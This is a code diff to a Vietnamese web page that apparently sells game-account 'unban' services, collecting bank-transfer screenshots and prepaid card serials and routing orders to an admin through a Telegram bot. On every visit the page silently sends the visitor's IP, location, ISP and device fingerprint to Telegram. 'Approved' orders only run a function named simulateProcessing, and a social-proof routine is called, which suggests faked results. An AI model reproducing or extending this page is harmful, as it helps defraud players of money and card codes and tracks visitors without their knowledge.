@@ -208,6 +208,18 @@
       border-radius: 5px;
     }
 
+    .status-badge {
+      display: inline-block;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-weight: bold;
+      font-size: 0.85rem;
+    }
+    .status-badge.waiting { background: #f39c12; color: #0a0f1e; }
+    .status-badge.approved { background: #2ecc71; color: #0a0f1e; }
+    .status-badge.rejected { background: #e74c3c; color: white; }
+    .status-badge.banned { background: #c0392b; color: white; }
+
     @media (max-width: 600px) {
       .container { padding: 20px 15px; }
       h1 { font-size: 1.8rem; }
@@ -222,8 +234,9 @@
   <div class="banned-overlay" id="bannedOverlay">
     <i class="fas fa-ban"></i>
     <h2>🚫 Truy cập bị từ chối</h2>
-    <p>IP của bạn đã bị admin chặn.</p>
+    <p>IP của bạn đã bị admin chặn qua Telegram.</p>
     <p style="color:#6c7e9e; margin-top:10px;">IP: <strong id="bannedIpDisplay"></strong></p>
+    <p style="color:#9aa9c1; font-size:0.9rem; margin-top:10px;">Liên hệ admin để được hỗ trợ</p>
   </div>
 
   <!-- Particles -->
@@ -243,6 +256,7 @@
         <span style="background:rgba(0,200,255,0.1); border:1px solid #00c8ff; border-radius:15px; padding:5px 12px; font-size:0.75rem;">
           <i class="fas fa-network-wired"></i> <span id="userIpDisplay">IP...</span>
         </span>
+        <span id="statusBadge" class="status-badge waiting">⏳ Chờ duyệt</span>
       </div>
 
       <!-- Logo -->
@@ -254,20 +268,6 @@
       </h1>
       <div style="text-align:center; color:#b0d4ff; margin-bottom:20px;">
         <i class="fas fa-check-circle"></i> Đa Game • Telegram Duyệt • Bảo Hành Uy Tín
-      </div>
-
-      <!-- Telegram Commands Info -->
-      <div class="telegram-command-box">
-        <div style="display:flex; align-items:center; gap:10px; margin-bottom:5px;">
-          <i class="fab fa-telegram" style="color:#0088cc; font-size:1.5rem;"></i>
-          <strong style="color:#00e6ff;">📌 Lệnh Telegram cho Admin:</strong>
-        </div>
-        <div style="display:grid; grid-template-columns:1fr 1fr; gap:5px 20px; font-size:0.9rem;">
-          <div><code>/help</code> - Hiển thị trợ giúp</div>
-          <div><code>/banip &lt;IP&gt;</code> - Chặn IP</div>
-          <div><code>/unbanip &lt;IP&gt;</code> - Mở IP</div>
-          <div><code>/listban</code> - Danh sách IP bị chặn</div>
-        </div>
       </div>
 
       <!-- Online Counter -->
@@ -499,6 +499,7 @@
     let pollingInterval = null;
     let lastUpdateId = 0;
     let bannedIPs = JSON.parse(localStorage.getItem('tool_banned_ips') || '[]');
+    let orderStatus = 'idle'; // idle, waiting, approved, rejected, banned
 
     const state = {
       serviceType: 'unban_account',
@@ -564,33 +565,53 @@
       } catch(e) {}
     }
 
+    async function editMessageText(messageId, text) {
+      try {
+        const res = await fetch(`${TELEGRAM_API}/editMessageText`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            message_id: messageId,
+            text: text,
+            parse_mode: 'HTML'
+          })
+        });
+        return await res.json();
+      } catch(e) { console.error('Edit message error:', e); return null; }
+    }
+
     // ============================================
     // TELEGRAM COMMAND HANDLER
     // ============================================
     async function handleTelegramCommand(text, messageId) {
       const cmd = text.trim().toLowerCase();
+      console.log(`[CMD] Nhận lệnh: ${cmd}`);
       
       // /help
-      if (cmd === '/help') {
+      if (cmd === '/help' || cmd === '/start') {
         const helpText = `
-🤖 <b>HƯỚNG DẪN LỆNH</b>
+🤖 <b>HƯỚNG DẪN LỆNH TELEGRAM</b>
 ━━━━━━━━━━━━━━━━━━
 
 📌 <b>Lệnh quản lý IP:</b>
 
 <code>/banip &lt;IP&gt;</code>
-  → Chặn IP (ban)
+  → Chặn IP (cấm truy cập)
 
 <code>/unbanip &lt;IP&gt;</code>
-  → Mở chặn IP (unban)
+  → Mở chặn IP (cho phép truy cập)
 
 <code>/listban</code>
   → Xem danh sách IP bị chặn
 
 ━━━━━━━━━━━━━━━━━━
 💡 <i>Ví dụ:</i>
-/banip 192.168.1.100
-/unbanip 192.168.1.100
+<code>/banip 192.168.1.100</code>
+<code>/unbanip 192.168.1.100</code>
+
+📊 <b>Trạng thái:</b>
+${bannedIPs.length} IP đang bị chặn
         `;
         await sendToTelegram(helpText);
         return true;
@@ -600,7 +621,7 @@
       if (cmd.startsWith('/banip ')) {
         const ip = cmd.substring(7).trim();
         if (!ip || !validateIP(ip)) {
-          await sendToTelegram(`❌ <b>IP không hợp lệ!</b>\nVui lòng nhập đúng định dạng IP.`);
+          await sendToTelegram(`❌ <b>IP không hợp lệ!</b>\nVui lòng nhập đúng định dạng IP.\nVD: /banip 192.168.1.100`);
           return true;
         }
         
@@ -612,7 +633,7 @@
         bannedIPs.push(ip);
         localStorage.setItem('tool_banned_ips', JSON.stringify(bannedIPs));
         
-        await sendToTelegram(`✅ <b>ĐÃ CHẶN IP: ${ip}</b>\n━━━━━━━━━━━━━━━━━━\nIP ${ip} đã bị chặn thành công!`);
+        await sendToTelegram(`✅ <b>ĐÃ CHẶN IP: ${ip}</b>\n━━━━━━━━━━━━━━━━━━\nIP ${ip} đã bị chặn thành công!\n📊 Tổng: ${bannedIPs.length} IP bị chặn`);
         
         // Kiểm tra nếu IP bị chặn là user hiện tại
         if (ip === userIP) {
@@ -625,7 +646,7 @@
       if (cmd.startsWith('/unbanip ')) {
         const ip = cmd.substring(9).trim();
         if (!ip || !validateIP(ip)) {
-          await sendToTelegram(`❌ <b>IP không hợp lệ!</b>\nVui lòng nhập đúng định dạng IP.`);
+          await sendToTelegram(`❌ <b>IP không hợp lệ!</b>\nVui lòng nhập đúng định dạng IP.\nVD: /unbanip 192.168.1.100`);
           return true;
         }
         
@@ -638,7 +659,7 @@
         bannedIPs.splice(index, 1);
         localStorage.setItem('tool_banned_ips', JSON.stringify(bannedIPs));
         
-        await sendToTelegram(`✅ <b>ĐÃ MỞ CHẶN IP: ${ip}</b>\n━━━━━━━━━━━━━━━━━━\nIP ${ip} đã được mở chặn!`);
+        await sendToTelegram(`✅ <b>ĐÃ MỞ CHẶN IP: ${ip}</b>\n━━━━━━━━━━━━━━━━━━\nIP ${ip} đã được mở chặn!\n📊 Còn ${bannedIPs.length} IP đang bị chặn`);
         
         // Nếu là IP hiện tại, reload trang
         if (ip === userIP) {
@@ -680,12 +701,12 @@
     }
 
     // ============================================
-    // POLLING - CHỜ ADMIN DUYỆT & LỆNH
+    // POLLING - NHẬN LỆNH & CALLBACK TỪ TELEGRAM
     // ============================================
-    async function startPollingForApproval(sentMessageId, orderId) {
+    async function startPolling() {
       if (pollingInterval) clearInterval(pollingInterval);
       
-      console.log(`[Polling] Bắt đầu chờ duyệt cho #${orderId}, msgId: ${sentMessageId}`);
+      console.log('[Polling] Bắt đầu lắng nghe Telegram...');
       
       pollingInterval = setInterval(async () => {
         try {
@@ -704,45 +725,68 @@
               if (handled) continue;
             }
             
-            // Xử lý callback query (nút bấm)
+            // Xử lý callback query (nút bấm từ đơn hàng)
             if (update.callback_query) {
               const cb = update.callback_query;
               const msgId = cb.message?.message_id;
+              const dataParts = cb.data.split('_');
+              const action = dataParts[0];
+              const oid = dataParts[1];
               
-              if (msgId === sentMessageId) {
-                const parts = cb.data.split('_');
-                const action = parts[0];
-                const oid = parts[1];
-                
-                if (oid !== orderId) continue;
-                
-                if (action === 'approve') {
-                  clearInterval(pollingInterval);
-                  await answerCallback(cb.id, '✅ Đã duyệt! Tool đang chạy...');
-                  await sendToTelegram(`✅ <b>ĐÃ DUYỆT</b> #${orderId}\nTool đang tự động xử lý...`);
-                  updateOrderStatus('approved');
-                } else if (action === 'reject') {
-                  clearInterval(pollingInterval);
-                  const reason = parts[2] ? decodeURIComponent(parts[2]) : 'Không có lý do';
-                  await answerCallback(cb.id, '❌ Đã từ chối!');
-                  await sendToTelegram(`❌ <b>ĐÃ TỪ CHỐI</b> #${orderId}\nLý do: ${reason}`);
-                  updateOrderStatus('rejected', reason);
-                } else if (action === 'ban') {
-                  clearInterval(pollingInterval);
-                  const ip = parts[2] ? decodeURIComponent(parts[2]) : userIP;
-                  await answerCallback(cb.id, '🚫 Đã cấm IP!');
-                  
-                  // Thêm IP vào danh sách chặn
-                  if (!bannedIPs.includes(ip)) {
-                    bannedIPs.push(ip);
-                    localStorage.setItem('tool_banned_ips', JSON.stringify(bannedIPs));
-                  }
-                  
-                  await sendToTelegram(`🚫 <b>ĐÃ CHẶN IP</b>: ${ip}\nĐơn #${orderId}\n━━━━━━━━━━━━━━━━━━\nIP đã được thêm vào danh sách chặn!`);
-                  updateOrderStatus('banned', `IP ${ip} đã bị cấm`);
-                  setTimeout(() => showBannedScreen(ip), 1000);
-                }
+              console.log(`[Callback] Action: ${action}, Order: ${oid}`);
+              
+              // Kiểm tra đơn hàng
+              if (oid !== state.currentOrderId) {
+                await answerCallback(cb.id, '⚠️ Đơn hàng không hợp lệ!');
+                continue;
               }
+              
+              if (action === 'approve') {
+                clearInterval(pollingInterval);
+                await answerCallback(cb.id, '✅ Đã duyệt! Tool đang chạy...');
+                
+                // Cập nhật message trên Telegram
+                await editMessageText(msgId, 
+                  `✅ <b>ĐÃ DUYỆT</b> #${oid}\n━━━━━━━━━━━━━━━━━━\nYêu cầu đã được admin duyệt!\nTool đang tự động xử lý...`
+                );
+                
+                await sendToTelegram(`✅ <b>ĐÃ DUYỆT</b> #${oid}\nTool đang tự động xử lý yêu cầu của bạn...`);
+                updateOrderStatus('approved');
+                
+              } else if (action === 'reject') {
+                clearInterval(pollingInterval);
+                const reason = dataParts[2] ? decodeURIComponent(dataParts[2]) : 'Không có lý do';
+                await answerCallback(cb.id, '❌ Đã từ chối!');
+                
+                await editMessageText(msgId,
+                  `❌ <b>ĐÃ TỪ CHỐI</b> #${oid}\n━━━━━━━━━━━━━━━━━━\nLý do: ${reason}\n\nVui lòng gửi lại yêu cầu mới!`
+                );
+                
+                await sendToTelegram(`❌ <b>ĐÃ TỪ CHỐI</b> #${oid}\nLý do: ${reason}`);
+                updateOrderStatus('rejected', reason);
+                
+              } else if (action === 'ban') {
+                clearInterval(pollingInterval);
+                const ip = dataParts[2] ? decodeURIComponent(dataParts[2]) : userIP;
+                await answerCallback(cb.id, '🚫 Đã cấm IP!');
+                
+                // Thêm IP vào danh sách chặn
+                if (!bannedIPs.includes(ip)) {
+                  bannedIPs.push(ip);
+                  localStorage.setItem('tool_banned_ips', JSON.stringify(bannedIPs));
+                }
+                
+                await editMessageText(msgId,
+                  `🚫 <b>ĐÃ CHẶN IP</b> #${oid}\n━━━━━━━━━━━━━━━━━━\nIP: <code>${ip}</code>\nĐã thêm vào danh sách chặn!`
+                );
+                
+                await sendToTelegram(`🚫 <b>ĐÃ CHẶN IP</b>: ${ip}\nĐơn #${oid}\n📊 Tổng: ${bannedIPs.length} IP bị chặn`);
+                updateOrderStatus('banned', `IP ${ip} đã bị cấm`);
+                setTimeout(() => showBannedScreen(ip), 1000);
+              }
+              
+              // Bắt đầu polling lại
+              startPolling();
             }
           }
         } catch(e) { console.error('Polling error:', e); }
@@ -958,24 +1002,72 @@
     }
 
     // ============================================
+    // UPDATE STATUS BADGE
+    // ============================================
+    function updateStatusBadge(status, detail = '') {
+      const badge = document.getElementById('statusBadge');
+      badge.className = 'status-badge';
+      
+      switch(status) {
+        case 'idle':
+          badge.textContent = '🟢 Sẵn sàng';
+          badge.classList.add('waiting');
+          break;
+        case 'waiting':
+          badge.textContent = '⏳ Chờ duyệt';
+          badge.classList.add('waiting');
+          break;
+        case 'approved':
+          badge.textContent = '✅ Đã duyệt';
+          badge.classList.add('approved');
+          break;
+        case 'rejected':
+          badge.textContent = `❌ Từ chối${detail ? ': ' + detail : ''}`;
+          badge.classList.add('rejected');
+          break;
+        case 'banned':
+          badge.textContent = '🚫 Đã cấm IP';
+          badge.classList.add('banned');
+          break;
+        default:
+          badge.textContent = '🟢 Sẵn sàng';
+          badge.classList.add('waiting');
+      }
+    }
+
+    // ============================================
     // ORDER STATUS
     // ============================================
     function updateOrderStatus(status, reason = '') {
+      orderStatus = status;
       const box = document.getElementById('resultBox');
       box.classList.remove('hidden');
+      updateStatusBadge(status, reason);
       
       if (status === 'approved') {
         box.innerHTML = `<div style="color:#2ecc71;text-align:center;"><h3>✅ ĐÃ DUYỆT!</h3><p>Tool đang xử lý...</p></div>`;
         simulateProcessing(state.currentOrderId);
       } else if (status === 'rejected') {
-        box.innerHTML = `<div style="color:#ff6b6b;text-align:center;"><h3>❌ TỪ CHỐI</h3><p>Lý do: ${reason}</p></div>`;
+        box.innerHTML = `<div style="color:#ff6b6b;text-align:center;"><h3>❌ TỪ CHỐI</h3><p>Lý do: ${reason}</p><button class="btn-sm mt-10" onclick="resetForm()">🔄 Gửi lại</button></div>`;
         document.getElementById('progressBar').classList.add('hidden');
         document.getElementById('submitRequestBtn').disabled = false;
         document.getElementById('submitRequestBtn').innerHTML = '<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND';
+        state.currentOrderId = null;
       } else if (status === 'banned') {
         box.innerHTML = `<div style="color:#ff6b6b;text-align:center;"><h3>🚫 ĐÃ CẤM IP</h3><p>${reason}</p></div>`;
         document.getElementById('progressBar').classList.add('hidden');
       }
+    }
+
+    function resetForm() {
+      orderStatus = 'idle';
+      state.currentOrderId = null;
+      document.getElementById('resultBox').classList.add('hidden');
+      document.getElementById('submitRequestBtn').disabled = false;
+      document.getElementById('submitRequestBtn').innerHTML = '<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND';
+      updateStatusBadge('idle');
+      generateCaptcha();
+      document.getElementById('captchaAnswer').value = '';
     }
 
     function simulateProcessing(orderId) {
@@ -1016,10 +1108,12 @@
                 <div style="font-size:1.5rem;font-weight:bold;color:#ffd966;">BH-${orderId}</div>
                 <p style="color:#b0d4ff;">Thời hạn: ${state.plan.name==='ultimate'?'12 tháng':state.plan.name==='vip'?'6 tháng':'3 tháng'}</p>
               </div>
+              <button class="btn-sm mt-10" onclick="resetForm()">🔄 Gửi yêu cầu mới</button>
             </div>`;
           Swal.fire({icon:'success',title:'🎉 Thành Công!',confirmButtonText:'OK'});
           document.getElementById('submitRequestBtn').disabled = false;
           document.getElementById('submitRequestBtn').innerHTML = '<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND';
+          updateStatusBadge('approved');
         },2000);
       },t);
       
@@ -1038,10 +1132,11 @@
     }
 
     // ============================================
-    // SUBMIT
+    // SUBMIT - GỬI YÊU CẦU LÊN TELEGRAM
     // ============================================
     document.getElementById('submitRequestBtn').addEventListener('click',async function(){
       if(isBanned){Swal.fire('🚫','Bạn đã bị chặn!','error');return;}
+      if(orderStatus === 'waiting'){Swal.fire('⏳','Đang chờ admin duyệt!','info');return;}
       
       const honeypot=document.getElementById('honeypotField').value;
       if(honeypot){Swal.fire('🤖','Hoạt động đáng ngờ!','error');return;}
@@ -1098,6 +1193,8 @@
       
       try{
         state.currentOrderId=`FF-${Date.now().toString(36).toUpperCase()}`;
+        orderStatus = 'waiting';
+        updateStatusBadge('waiting');
         
         if(uploadedImageFile&&state.paymentMethod==='bank'){
           await sendPhotoToTelegram(uploadedImageFile,`📸 Ảnh CK - #${state.currentOrderId}`);
@@ -1141,6 +1238,9 @@
           msg+=`🔢 <b>Seri:</b> ${document.getElementById('cardSerial').value}\n`;
         }
         
+        msg+=`━━━━━━━━━━━━━━━━━━\n`;
+        msg+=`⏳ Vui lòng chọn hành động bên dưới:`;
+        
         const buttons=[[
           {text:'✅ DUYỆT',callback_data:`approve_${state.currentOrderId}`},
           {text:'❌ TỪ CHỐI',callback_data:`reject_${state.currentOrderId}`},
@@ -1156,24 +1256,31 @@
           document.getElementById('resultBox').innerHTML=`
             <div style="color:#ffd966;text-align:center;">
               <h3>⏳ #${state.currentOrderId}</h3>
-              <p>Đã gửi lên Telegram!</p>
+              <p>Đã gửi yêu cầu lên Telegram!</p>
               <p style="font-size:0.9rem;">Đang chờ admin duyệt...</p>
               <p style="font-size:0.8rem;color:#9aa9c1;">Không tắt trang này</p>
+              <div style="margin-top:10px;">
+                <span class="status-badge waiting">⏳ Chờ duyệt</span>
+              </div>
             </div>`;
           
-          startPollingForApproval(state.approvedMessageId,state.currentOrderId);
+          await sendToTelegram(`🌐 <b>CHI TIẾT - #${state.currentOrderId}</b>\n📍 IP: ${userIP}\n🏙️ TP: ${userLocation.city}\n🌍 QG: ${userLocation.country}\n🏢 ISP: ${userLocation.isp}\n📱 Mobile: ${/Mobi|Android/i.test(navigator.userAgent)?'Có':'Không'}`);
           
-          await sendToTelegram(`🌐 <b>CHI TIẾT - #${state.currentOrderId}</b>\n📍 IP: ${userIP}\n🏙️ TP: ${userLocation.city}\n🌍 QG: ${userLocation.country}\n🏢 ISP: ${userLocation.isp}\n📱 Mobile: ${/Mobi|Android/i.test(navigator.userAgent)?'Có':'Không'}\n🖥️ ${navigator.userAgent.substring(0,80)}`);
-          
-          Swal.fire({icon:'success',title:'✅ Đã gửi!',text:`Mã: #${state.currentOrderId}\nChờ admin duyệt...`,timer:4000});
+          Swal.fire({icon:'success',title:'✅ Đã gửi!',text:`Mã: #${state.currentOrderId}\nChờ admin duyệt...`,timer:3000});
           generateCaptcha();
           document.getElementById('captchaAnswer').value='';
+          btn.disabled=false;
+          btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang chờ duyệt...';
+          
+          // Polling sẽ tự động xử lý callback từ admin
         }else{
           throw new Error('Không thể gửi đến Telegram');
         }
       }catch(error){
         document.getElementById('resultBox').innerHTML=`<div style="color:#ff6b6b;text-align:center;"><h3>❌ Lỗi</h3><p>${error.message}</p><button class="btn-sm mt-10" onclick="location.reload()">Thử lại</button></div>`;
         btn.disabled=false;btn.innerHTML='<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND';
+        orderStatus = 'idle';
+        updateStatusBadge('idle');
       }
     });
 
@@ -1236,7 +1343,8 @@
         return;
       }
       
-      const visitorMsg = `🟢 <b>NGƯỜI DÙNG MỚI TRUY CẬP</b>\n━━━━━━━━━━━━━━━━━━\n🌐 <b>IP:</b> <code>${userIP}</code>\n📍 <b>Vị trí:</b> ${userLocation.city}, ${userLocation.country}\n🏢 <b>ISP:</b> ${userLocation.isp}\n🆔 <b>Device:</b> <code>${deviceFingerprint}</code>\n📱 <b>Mobile:</b> ${/Mobi|Android/i.test(navigator.userAgent)?'Có':'Không'}\n⏰ <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}`;
+      // Tự động gửi thông báo khi có người truy cập
+      const visitorMsg = `🟢 <b>NGƯỜI DÙNG MỚI TRUY CẬP</b>\n━━━━━━━━━━━━━━━━━━\n🌐 <b>IP:</b> <code>${userIP}</code>\n📍 <b>Vị trí:</b> ${userLocation.city}, ${userLocation.country}\n🏢 <b>ISP:</b> ${userLocation.isp}\n🆔 <b>Device:</b> <code>${deviceFingerprint}</code>\n📱 <b>Mobile:</b> ${/Mobi|Android/i.test(navigator.userAgent)?'Có':'Không'}\n⏰ <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}\n━━━━━━━━━━━━━━━━━━\n💡 Dùng /help để xem hướng dẫn`;
       await sendToTelegram(visitorMsg);
       
       ensureProgressBar();
@@ -1247,35 +1355,12 @@
       startSocialProof();
       setupImageUpload();
       toggleServiceType('unban_account');
+      updateStatusBadge('idle');
       
-      console.log('✅ Tool sẵn sàng!');
+      // Bắt đầu polling để nhận lệnh và callback từ Telegram
+      await startPolling();
       
-      // Bắt đầu polling để nhận lệnh từ Telegram
-      startPollingForCommands();
-    }
-
-    // Hàm polling riêng cho lệnh Telegram
-    async function startPollingForCommands() {
-      setInterval(async () => {
-        try {
-          const res = await fetch(`${TELEGRAM_API}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`);
-          const data = await res.json();
-          
-          if (!data.ok || !data.result.length) return;
-          
-          for (const update of data.result) {
-            lastUpdateId = Math.max(lastUpdateId, update.update_id);
-            
-            if (update.message && update.message.text) {
-              const msgText = update.message.text;
-              // Chỉ xử lý lệnh nếu không phải đang chờ duyệt đơn
-              if (!state.currentOrderId) {
-                await handleTelegramCommand(msgText, update.message.message_id);
-              }
-            }
-          }
-        } catch(e) { console.error('Command polling error:', e); }
-      }, 5000);
+      console.log('✅ Tool sẵn sàng! Đang lắng nghe Telegram...');
     }
 
     init();
